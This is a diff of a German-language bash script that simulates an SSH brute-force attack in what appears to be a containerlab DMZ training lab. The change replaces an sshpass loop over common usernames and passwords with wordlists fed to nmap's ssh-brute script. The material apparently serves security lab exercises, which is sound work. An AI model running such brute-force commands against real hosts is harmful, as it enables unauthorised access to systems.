@@ -12,18 +12,18 @@ ATTACKER="${2:-attacker-internet}"
 echo "[+] Starte SSH Brute Force von $ATTACKER gegen $TARGET_HOST"
 
 # Simuliere mehrere fehlgeschlagene Login-Versuche
-USERNAMES=("admin" "root" "user" "test" "administrator" "guest" "oracle" "postgres" "mysql")
-PASSWORDS=("password" "123456" "admin" "root" "test" "password123" "admin123")
+# Erstelle temporäre Wortlisten im Container
+sudo docker exec clab-dmz-project-sun-$ATTACKER bash -c "echo -e 'admin\nroot\nuser\ntest\nadministrator\nguest\noracle\npostgres\nmysql' > /tmp/users.txt"
+sudo docker exec clab-dmz-project-sun-$ATTACKER bash -c "echo -e 'password\n123456\nadmin\nroot\ntest\npassword123\nadmin123' > /tmp/pass.txt"
 
-for user in "${USERNAMES[@]}"; do
-    for pass in "${PASSWORDS[@]}"; do
-        echo "[*] Versuche Login: $user:$pass"
-        sudo docker exec clab-dmz-project-sun-$ATTACKER \
-            sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
-            "$user@$TARGET_HOST" "echo success" 2>/dev/null || true
-        sleep 0.5
-    done
-done
+echo "[*] Führe Nmap SSH Brute Force aus..."
+sudo docker exec clab-dmz-project-sun-$ATTACKER \
+    nmap -p 22 --script ssh-brute --script-args userdb=/tmp/users.txt,passdb=/tmp/pass.txt \
+    --script-args ssh-brute.timeout=2s \
+    $TARGET_HOST
+
+# Aufräumen
+sudo docker exec clab-dmz-project-sun-$ATTACKER rm /tmp/users.txt /tmp/pass.txt
 
 echo ""
 echo "[+] Brute Force Angriff abgeschlossen"
